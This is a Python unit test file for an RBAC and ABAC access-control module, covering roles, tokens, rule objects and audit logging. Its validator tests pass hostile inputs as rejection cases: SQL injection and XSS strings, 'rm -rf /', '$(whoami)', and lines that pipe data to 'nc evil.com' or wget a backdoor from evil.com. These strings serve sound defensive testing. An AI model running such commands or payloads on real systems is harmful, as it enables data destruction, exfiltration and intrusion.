"""Unit tests for core RBAC functionality.

This test suite focuses on unit testing the core RBAC components
without requiring complex setup or integration dependencies.
"""

from datetime import datetime, timedelta, timezone
from unittest.mock import Mock, patch

import pytest

from auth.comprehensive_audit_logger import AccessDecisionAuditor
from auth.rbac_enhancements import (
    ABACEffect,
    ABACRule,
    AccessContext,
    EnhancedRBACManager,
    RequestStatus,
    ResourceContext,
    RoleAssignmentRequest,
)
from auth.security_implementation import (
    ROLE_PERMISSIONS,
    AuthenticationManager,
    Permission,
    SecurityValidator,
    TokenData,
    User,
    UserRole,
)


class TestRolePermissionMatrix:
    """Test the role-permission matrix."""

    def test_all_roles_have_permissions(self):
        """Test that all roles have defined permissions."""
        for role in UserRole:
            assert role in ROLE_PERMISSIONS
            assert isinstance(ROLE_PERMISSIONS[role], list)
            assert len(ROLE_PERMISSIONS[role]) > 0

    def test_role_hierarchy_permissions(self):
        """Test role hierarchy in permissions."""
        # Observer should have the minimum permissions
        observer_perms = set(ROLE_PERMISSIONS[UserRole.OBSERVER])
        assert Permission.VIEW_AGENTS in observer_perms
        assert Permission.VIEW_METRICS in observer_perms
        assert len(observer_perms) == 2

        # Agent Manager should have observer permissions plus more
        agent_manager_perms = set(ROLE_PERMISSIONS[UserRole.AGENT_MANAGER])
        assert observer_perms.issubset(agent_manager_perms)
        assert Permission.CREATE_AGENT in agent_manager_perms
        assert Permission.MODIFY_AGENT in agent_manager_perms

        # Researcher should have agent manager permissions plus more
        researcher_perms = set(ROLE_PERMISSIONS[UserRole.RESEARCHER])
        assert agent_manager_perms.issubset(researcher_perms)
        assert Permission.CREATE_COALITION in researcher_perms

        # Admin should have all permissions
        admin_perms = set(ROLE_PERMISSIONS[UserRole.ADMIN])
        assert researcher_perms.issubset(admin_perms)
        assert Permission.ADMIN_SYSTEM in admin_perms
        assert Permission.DELETE_AGENT in admin_perms

    def test_permission_enum_completeness(self):
        """Test that all permissions are accounted for."""
        all_assigned_perms = set()
        for role_perms in ROLE_PERMISSIONS.values():
            all_assigned_perms.update(role_perms)

        # Check that all Permission enum values are used
        all_permission_values = set(Permission)
        assert all_assigned_perms == all_permission_values

    def test_sensitive_permissions_restricted(self):
        """Test that sensitive permissions are properly restricted."""
        # Only admin should have system admin permission
        admin_only_perms = {Permission.ADMIN_SYSTEM, Permission.DELETE_AGENT}

        for perm in admin_only_perms:
            roles_with_perm = [
                role
                for role, perms in ROLE_PERMISSIONS.items()
                if perm in perms
            ]
            assert roles_with_perm == [
                UserRole.ADMIN
            ], f"Permission {perm} should only be granted to admin"


class TestUserModel:
    """Test User model functionality."""

    def test_user_creation(self):
        """Test creating a user."""
        user = User(
            user_id="user_001",
            username="test_user",
            email="test@example.com",
            role=UserRole.RESEARCHER,
            created_at=datetime.now(timezone.utc),
        )

        assert user.user_id == "user_001"
        assert user.username == "test_user"
        assert user.email == "test@example.com"
        assert user.role == UserRole.RESEARCHER
        assert user.is_active is True
        assert user.last_login is None

    def test_user_defaults(self):
        """Test user model defaults."""
        user = User(
            user_id="user_002",
            username="test_user_2",
            email="test2@example.com",
            role=UserRole.OBSERVER,
            created_at=datetime.now(timezone.utc),
        )

        assert user.is_active is True
        assert user.last_login is None


class TestTokenData:
    """Test TokenData model functionality."""

    def test_token_data_creation(self):
        """Test creating token data."""
        token_data = TokenData(
            user_id="user_001",
            username="test_user",
            role=UserRole.RESEARCHER,
            permissions=ROLE_PERMISSIONS[UserRole.RESEARCHER],
            exp=datetime.now(timezone.utc) + timedelta(hours=1),
        )

        assert token_data.user_id == "user_001"
        assert token_data.username == "test_user"
        assert token_data.role == UserRole.RESEARCHER
        assert Permission.CREATE_AGENT in token_data.permissions
        assert Permission.ADMIN_SYSTEM not in token_data.permissions

    def test_token_expiry(self):
        """Test token expiry handling."""
        # Create expired token
        expired_token = TokenData(
            user_id="user_001",
            username="test_user",
            role=UserRole.OBSERVER,
            permissions=ROLE_PERMISSIONS[UserRole.OBSERVER],
            exp=datetime.now(timezone.utc) - timedelta(hours=1),  # Expired
        )

        # Create valid token
        valid_token = TokenData(
            user_id="user_002",
            username="test_user_2",
            role=UserRole.RESEARCHER,
            permissions=ROLE_PERMISSIONS[UserRole.RESEARCHER],
            exp=datetime.now(timezone.utc) + timedelta(hours=1),  # Valid
        )

        # Check expiry
        now = datetime.now(timezone.utc)
        assert expired_token.exp < now
        assert valid_token.exp > now


class TestSecurityValidator:
    """Test SecurityValidator functionality."""

    def test_sql_injection_detection(self):
        """Test SQL injection detection."""
        validator = SecurityValidator()

        # Valid inputs
        assert validator.validate_sql_input("normal_string") is True
        assert validator.validate_sql_input("user@example.com") is True
        assert validator.validate_sql_input("Agent Name 123") is True

        # SQL injection attempts
        assert validator.validate_sql_input("'; DROP TABLE users; --") is False
        assert validator.validate_sql_input("1' OR '1'='1") is False
        assert (
            validator.validate_sql_input("UNION SELECT * FROM users") is False
        )
        assert validator.validate_sql_input("admin'--") is False

    def test_xss_detection(self):
        """Test XSS detection."""
        validator = SecurityValidator()

        # Valid inputs
        assert validator.validate_xss_input("normal text") is True
        assert validator.validate_xss_input("user@example.com") is True
        assert validator.validate_xss_input("Agent Name 123") is True

        # XSS attempts
        assert (
            validator.validate_xss_input("<script>alert('xss')</script>")
            is False
        )
        assert validator.validate_xss_input("javascript:alert('xss')") is False
        assert (
            validator.validate_xss_input("<img src=x onerror=alert('xss')>")
            is False
        )
        assert (
            validator.validate_xss_input("<iframe src='evil.com'></iframe>")
            is False
        )

    def test_command_injection_detection(self):
        """Test command injection detection."""
        validator = SecurityValidator()

        # Valid inputs
        assert validator.validate_command_injection("normal_command") is True
        assert validator.validate_command_injection("file.txt") is True
        assert validator.validate_command_injection("agent_name") is True

        # Command injection attempts
        assert (
            validator.validate_command_injection("file.txt; rm -rf /") is False
        )
        assert (
            validator.validate_command_injection("data | nc evil.com 1234")
            is False
        )
        assert (
            validator.validate_command_injection(
                "file.txt && wget evil.com/backdoor"
            )
            is False
        )
        assert validator.validate_command_injection("$(whoami)") is False

    def test_gmn_spec_sanitization(self):
        """Test GMN specification sanitization."""
        validator = SecurityValidator()

        # Valid GMN spec
        valid_gmn = """
        [nodes]
        state1: state {num_states: 5}
        obs1: observation {num_observations: 3}
        action1: action {num_actions: 4}

        [edges]
        state1 -> obs1: depends_on
        """

        sanitized = validator.sanitize_gmn_spec(valid_gmn)
        assert sanitized == valid_gmn

        # Invalid GMN with SQL injection
        with pytest.raises(ValueError, match="SQL injection detected"):
            validator.sanitize_gmn_spec("'; DROP TABLE agents; --")

        # Invalid GMN with XSS
        with pytest.raises(ValueError, match="XSS attempt detected"):
            validator.sanitize_gmn_spec("<script>alert('xss')</script>")

        # GMN spec too large
        with pytest.raises(ValueError, match="GMN spec too large"):
            validator.sanitize_gmn_spec("x" * 100001)

    def test_observation_data_sanitization(self):
        """Test observation data sanitization."""
        validator = SecurityValidator()

        # Valid observation data
        valid_obs = {
            "position": [1, 2, 3],
            "velocity": 5.5,
            "status": "active",
            "metadata": {
                "created_at": "2023-01-01T00:00:00Z",
                "agent_id": "agent_001",
            },
        }

        sanitized = validator.sanitize_observation_data(valid_obs)
        assert sanitized == valid_obs

        # Invalid observation with SQL injection in key
        with pytest.raises(ValueError, match="Invalid observation key"):
            validator.sanitize_observation_data(
                {"'; DROP TABLE observations; --": "value"}
            )

        # Invalid observation with XSS in value
        with pytest.raises(
            ValueError, match="Invalid observation value \\(XSS\\)"
        ):
            validator.sanitize_observation_data(
                {"key": "<script>alert('xss')</script>"}
            )

        # Invalid observation with oversized value
        with pytest.raises(ValueError, match="Observation value too large"):
            validator.sanitize_observation_data({"key": "x" * 10001})


class TestABACRule:
    """Test ABAC rule functionality."""

    def test_abac_rule_creation(self):
        """Test creating ABAC rules."""
        rule = ABACRule(
            id="test_rule_001",
            name="Test Rule",
            description="Test rule for unit testing",
            resource_type="agent",
            action="view",
            subject_conditions={"role": ["researcher", "admin"]},
            resource_conditions={"department": "research"},
            environment_conditions={
                "time_range": {"start": "09:00", "end": "17:00"}
            },
            effect=ABACEffect.ALLOW,
            priority=100,
            created_at=datetime.now(timezone.utc),
            created_by="test_system",
        )

        assert rule.id == "test_rule_001"
        assert rule.name == "Test Rule"
        assert rule.effect == ABACEffect.ALLOW
        assert rule.priority == 100
        assert rule.is_active is True
        assert "researcher" in rule.subject_conditions["role"]
        assert rule.resource_conditions["department"] == "research"

    def test_abac_rule_conditions(self):
        """Test ABAC rule conditions."""
        # Subject conditions
        subject_conditions = {
            "role": ["admin"],
            "department": ["IT", "Security"],
            "min_risk_score": 0.0,
            "max_risk_score": 0.5,
        }

        # Resource conditions
        resource_conditions = {
            "ownership_required": True,
            "same_department": True,
            "classification": "internal",
            "sensitivity_level": "confidential",
        }

        # Environment conditions
        environment_conditions = {
            "time_range": {"start": "08:00", "end": "18:00"},
            "days": ["Monday", "Tuesday", "Wednesday", "Thursday", "Friday"],
            "ip_whitelist": ["192.168.1.0/24", "10.0.0.0/8"],
            "location": "office",
        }

        rule = ABACRule(
            id="complex_rule",
            name="Complex Rule",
            description="Complex rule with multiple conditions",
            resource_type="*",
            action="*",
            subject_conditions=subject_conditions,
            resource_conditions=resource_conditions,
            environment_conditions=environment_conditions,
            effect=ABACEffect.ALLOW,
            priority=200,
            created_at=datetime.now(timezone.utc),
            created_by="admin",
        )

        assert rule.subject_conditions == subject_conditions
        assert rule.resource_conditions == resource_conditions
        assert rule.environment_conditions == environment_conditions


class TestRoleAssignmentRequest:
    """Test role assignment request functionality."""

    def test_role_assignment_request_creation(self):
        """Test creating role assignment requests."""
        request = RoleAssignmentRequest(
            id="req_001",
            requester_id="admin_001",
            target_user_id="user_001",
            target_username="test_user",
            current_role=UserRole.OBSERVER,
            requested_role=UserRole.RESEARCHER,
            justification="User needs to create agents for research",
            business_justification="Research project approval #12345",
            temporary=False,
            expiry_date=None,
            status=RequestStatus.PENDING,
            created_at=datetime.now(timezone.utc),
        )

        assert request.id == "req_001"
        assert request.requester_id == "admin_001"
        assert request.target_user_id == "user_001"
        assert request.current_role == UserRole.OBSERVER
        assert request.requested_role == UserRole.RESEARCHER
        assert request.status == RequestStatus.PENDING
        assert request.temporary is False
        assert request.auto_approved is False

    def test_temporary_role_assignment(self):
        """Test temporary role assignment requests."""
        expiry_date = datetime.now(timezone.utc) + timedelta(hours=24)

        request = RoleAssignmentRequest(
            id="temp_req_001",
            requester_id="admin_001",
            target_user_id="user_001",
            target_username="test_user",
            current_role=UserRole.OBSERVER,
            requested_role=UserRole.RESEARCHER,
            justification="Temporary access for project",
            business_justification="24-hour project access",
            temporary=True,
            expiry_date=expiry_date,
            status=RequestStatus.PENDING,
            created_at=datetime.now(timezone.utc),
        )

        assert request.temporary is True
        assert request.expiry_date == expiry_date
        assert request.expiry_date > datetime.now(timezone.utc)


class TestAccessContext:
    """Test AccessContext functionality."""

    def test_access_context_creation(self):
        """Test creating access contexts."""
        context = AccessContext(
            user_id="user_001",
            username="test_user",
            role=UserRole.RESEARCHER,
            permissions=ROLE_PERMISSIONS[UserRole.RESEARCHER],
            ip_address="192.168.1.100",
            user_agent="Mozilla/5.0 (Test Browser)",
            timestamp=datetime.now(timezone.utc),
            session_id="session_001",
            department="Research",
            location="Office",
            device_id="device_001",
            risk_score=0.2,
        )

        assert context.user_id == "user_001"
        assert context.username == "test_user"
        assert context.role == UserRole.RESEARCHER
        assert context.ip_address == "192.168.1.100"
        assert context.department == "Research"
        assert context.risk_score == 0.2
        assert Permission.CREATE_AGENT in context.permissions

    def test_access_context_minimal(self):
        """Test creating minimal access context."""
        context = AccessContext(
            user_id="user_002",
            username="minimal_user",
            role=UserRole.OBSERVER,
            permissions=ROLE_PERMISSIONS[UserRole.OBSERVER],
        )

        assert context.user_id == "user_002"
        assert context.username == "minimal_user"
        assert context.role == UserRole.OBSERVER
        assert context.ip_address is None
        assert context.department is None
        assert context.risk_score is None


class TestResourceContext:
    """Test ResourceContext functionality."""

    def test_resource_context_creation(self):
        """Test creating resource contexts."""
        context = ResourceContext(
            resource_id="agent_001",
            resource_type="agent",
            owner_id="user_001",
            department="Research",
            classification="internal",
            sensitivity_level="confidential",
            created_at=datetime.now(timezone.utc),
            last_modified=datetime.now(timezone.utc),
            metadata={
                "agent_name": "Research Agent",
                "agent_template": "basic_explorer",
                "agent_status": "active",
            },
        )

        assert context.resource_id == "agent_001"
        assert context.resource_type == "agent"
        assert context.owner_id == "user_001"
        assert context.department == "Research"
        assert context.classification == "internal"
        assert context.sensitivity_level == "confidential"
        assert context.metadata["agent_name"] == "Research Agent"

    def test_resource_context_minimal(self):
        """Test creating minimal resource context."""
        context = ResourceContext(resource_type="system")

        assert context.resource_type == "system"
        assert context.resource_id is None
        assert context.owner_id is None
        assert context.department is None
        assert context.metadata == {}


class TestAuditLogger:
    """Test audit logger functionality."""

    def test_audit_logger_creation(self):
        """Test creating audit logger."""
        auditor = AccessDecisionAuditor()

        assert auditor.decision_log == []
        assert auditor.session_log == {}

    def test_rbac_decision_logging(self):
        """Test RBAC decision logging."""
        auditor = AccessDecisionAuditor()

        auditor.log_rbac_decision(
            user_id="user_001",
            username="test_user",
            role="researcher",
            required_permission="create_agent",
            has_permission=True,
            endpoint="/api/v1/agents",
            resource_id="agent_001",
            metadata={"action": "create"},
        )

        assert len(auditor.decision_log) == 1
        log_entry = auditor.decision_log[0]

        assert log_entry["decision_type"] == "rbac"
        assert log_entry["user_id"] == "user_001"
        assert log_entry["username"] == "test_user"
        assert log_entry["role"] == "researcher"
        assert log_entry["required_permission"] == "create_agent"
        assert log_entry["has_permission"] is True
        assert log_entry["endpoint"] == "/api/v1/agents"
        assert log_entry["resource_id"] == "agent_001"
        assert log_entry["decision"] == "allow"
        assert log_entry["metadata"]["action"] == "create"

    def test_abac_decision_logging(self):
        """Test ABAC decision logging."""
        auditor = AccessDecisionAuditor()

        auditor.log_abac_decision(
            user_id="user_001",
            username="test_user",
            resource_type="agent",
            resource_id="agent_001",
            action="modify",
            decision=False,
            reason="User not owner of resource",
            applied_rules=["Resource Ownership Control"],
            context={"ip_address": "192.168.1.100"},
        )

        assert len(auditor.decision_log) == 1
        log_entry = auditor.decision_log[0]

        assert log_entry["decision_type"] == "abac"
        assert log_entry["user_id"] == "user_001"
        assert log_entry["resource_type"] == "agent"
        assert log_entry["resource_id"] == "agent_001"
        assert log_entry["action"] == "modify"
        assert log_entry["decision"] == "deny"
        assert log_entry["reason"] == "User not owner of resource"
        assert "Resource Ownership Control" in log_entry["applied_rules"]
        assert log_entry["context"]["ip_address"] == "192.168.1.100"

    def test_ownership_check_logging(self):
        """Test ownership check logging."""
        auditor = AccessDecisionAuditor()

        auditor.log_ownership_check(
            user_id="user_001",
            username="test_user",
            resource_type="agent",
            resource_id="agent_001",
            is_owner=True,
            admin_override=False,
            metadata={"action": "modify"},
        )

        assert len(auditor.decision_log) == 1
        log_entry = auditor.decision_log[0]

        assert log_entry["decision_type"] == "ownership"
        assert log_entry["user_id"] == "user_001"
        assert log_entry["resource_type"] == "agent"
        assert log_entry["resource_id"] == "agent_001"
        assert log_entry["is_owner"] is True
        assert log_entry["admin_override"] is False
        assert log_entry["decision"] == "allow"
        assert log_entry["metadata"]["action"] == "modify"

    def test_session_event_logging(self):
        """Test session event logging."""
        auditor = AccessDecisionAuditor()

        auditor.log_session_event(
            user_id="user_001",
            username="test_user",
            event_type="session_start",
            session_id="session_001",
            ip_address="192.168.1.100",
            user_agent="Mozilla/5.0 (Test Browser)",
            metadata={"login_method": "password"},
        )

        # Check session log
        assert "session_001" in auditor.session_log
        session_data = auditor.session_log["session_001"]
        assert session_data["user_id"] == "user_001"
        assert session_data["username"] == "test_user"
        assert len(session_data["events"]) == 1

        event = session_data["events"][0]
        assert event["event_type"] == "session_start"
        assert event["session_id"] == "session_001"
        assert event["ip_address"] == "192.168.1.100"
        assert event["metadata"]["login_method"] == "password"


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
